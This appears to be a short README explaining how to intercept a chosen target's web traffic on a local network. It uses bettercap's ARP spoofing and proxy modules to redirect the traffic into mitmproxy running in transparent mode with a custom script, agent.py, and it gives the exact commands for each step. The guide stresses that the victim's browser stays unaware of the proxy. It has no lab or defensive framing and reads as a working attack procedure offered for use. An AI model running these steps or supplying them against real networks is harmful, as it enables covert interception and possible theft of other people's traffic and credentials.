How to set up mitmproxy with bettercap
======================================
Step 1: make sure desired port is unused (8080 in this context)
-----------------------------------------------
- mitmproxy will listen on this port

Step 2: run bettercap with following command:
----------------------------------------------
```bash
./init.sh
```
- this will set up bettercap with necessary parameters

Step 3: set target and let bettercap redirect traffic to mitmproxy
---------------------------------------------------
```bettercap
set arp.spoof.targets <IP ADDRESS OF TARGET>
any.proxy on
arp.spoof on
```
- you can use `net.show` to let bettercap display hosts that are up in the local network

Step 4: run mitmproxy with following code:
------------------------------------------
```bash
sudo mitmproxy --mode transparent -p 8080 -s agent.py --set block_global=false
```
- mitmproxy has to run in transparent mode because target browser is unaware of the proxy
    - normally, the browser knows if mitmproxy is listening and this requires manual setup on the browser side
    - transparent mode goes under the assumption that the browser isn't aware of it listening (necessary for intercepting)
- -s agent.py tells mitmproxy which python script to use
